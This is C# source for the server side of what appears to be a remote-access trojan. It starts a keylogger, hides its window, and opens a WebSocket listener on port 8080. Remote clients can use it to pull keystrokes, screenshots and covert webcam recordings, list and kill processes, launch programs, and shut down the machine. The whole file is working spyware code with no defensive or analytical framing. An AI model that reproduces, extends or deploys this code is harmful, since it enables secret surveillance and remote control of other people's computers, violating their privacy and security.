using System;
using System.Windows.Forms;
using System.Net;
using System.Net.WebSockets;
using System.IO;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text;
using KeyLogger;

namespace server
{
    public partial class server : Form
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        public server() { InitializeComponent(); CheckForIllegalCrossThreadCalls = false; }

        private void button1_Click(object sender, EventArgs e)
        {
            Thread tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
            tklog.SetApartmentState(ApartmentState.STA); tklog.Start();
            Task.Run(() => StartWebSocketServer());
            this.Hide();
        }

        private async Task StartWebSocketServer()
        {
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add("http://*:8080/");
            try { listener.Start(); } catch { return; }

            while (true)
            {
                HttpListenerContext ctx = await listener.GetContextAsync();
                if (ctx.Request.IsWebSocketRequest) ProcessWs(ctx);
                else { ctx.Response.StatusCode = 400; ctx.Response.Close(); }
            }
        }

        private async void ProcessWs(HttpListenerContext ctx)
        {
            HttpListenerWebSocketContext wsCtx = await ctx.AcceptWebSocketAsync(null);
            WebSocket ws = wsCtx.WebSocket;
            byte[] buf = new byte[1024 * 10000];

            while (ws.State == WebSocketState.Open)
            {
                try
                {
                    WebSocketReceiveResult res = await ws.ReceiveAsync(new ArraySegment<byte>(buf), CancellationToken.None);
                    if (res.MessageType == WebSocketMessageType.Close) break;
                    string cmd = Encoding.UTF8.GetString(buf, 0, res.Count);
                    string reply = await Task.Run(() => Exec(cmd));
                    if (ws.State == WebSocketState.Open)
                    {
                        byte[] outBuf = Encoding.UTF8.GetBytes(reply);
                        await ws.SendAsync(new ArraySegment<byte>(outBuf), WebSocketMessageType.Text, true, CancellationToken.None);
                    }
                }
                catch { break; }
            }
        }

        private string Exec(string cmd)
        {
            try
            {
                string[] p = cmd.Split('|');
                switch (p[0])
                {
                    case "SHUTDOWN": Process.Start("shutdown", "/s /t 0"); return "LOG: Shutdown initiated";
                    case "RESTART": Process.Start("shutdown", "/r /t 0"); return "LOG: Restart initiated";
                    case "KEYLOG": string l = ""; lock (KeyLogger.appstart.logLock) { l = KeyLogger.appstart.logBuffer.ToString(); } return "KEYLOG|" + l;
                    case "LIST_APPS": return "LIST_APPS|" + GetApps();
                    case "LIST_PROCS": return "LIST_PROCS|" + GetProcs();
                    case "START": try { Process.Start(p[1]); return "LOG: Started " + p[1]; } catch { return "LOG: Error"; }
                    case "KILL": try { Process.GetProcessById(int.Parse(p[1])).Kill(); return "LOG: Killed " + p[1]; } catch { return "LOG: Error"; }
                    case "SCREENSHOT": return "IMG|" + Convert.ToBase64String(CapScreen());
                    case "WEBCAM": return RecVid(10);
                }
            }
            catch (Exception ex) { return "LOG: " + ex.Message; }
            return "";
        }

        string GetApps()
        {
            StringBuilder sb = new StringBuilder();
            foreach (Process p in Process.GetProcesses()) if (!string.IsNullOrEmpty(p.MainWindowTitle)) sb.Append($"{p.Id},{p.MainWindowTitle};");
            return sb.ToString();
        }
        string GetProcs()
        {
            StringBuilder sb = new StringBuilder();
            foreach (Process p in Process.GetProcesses()) sb.Append($"{p.Id},{p.ProcessName};");
            return sb.ToString();
        }
        byte[] CapScreen()
        {
            Rectangle b = Screen.PrimaryScreen.Bounds;
            using (Bitmap bmp = new Bitmap(b.Width, b.Height)) using (Graphics g = Graphics.FromImage(bmp)) using (MemoryStream ms = new MemoryStream())
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, b.Size); bmp.Save(ms, ImageFormat.Jpeg); return ms.ToArray();
            }
        }
        string RecVid(int s)
        {
            try
            {
                string p = Path.Combine(Path.GetTempPath(), "rec.avi"); if (File.Exists(p)) File.Delete(p);
                mciSendString("open new type avivideo alias myvideo", null, 0, 0);
                mciSendString("record myvideo", null, 0, 0);
                Thread.Sleep(s * 1000);
                mciSendString("save myvideo \"" + p + "\"", null, 0, 0);
                mciSendString("close myvideo", null, 0, 0);
                if (File.Exists(p)) { byte[] b = File.ReadAllBytes(p); return "VID|" + Convert.ToBase64String(b); }
            }
            catch { }
            return "LOG: Cam Error";
        }
    }
}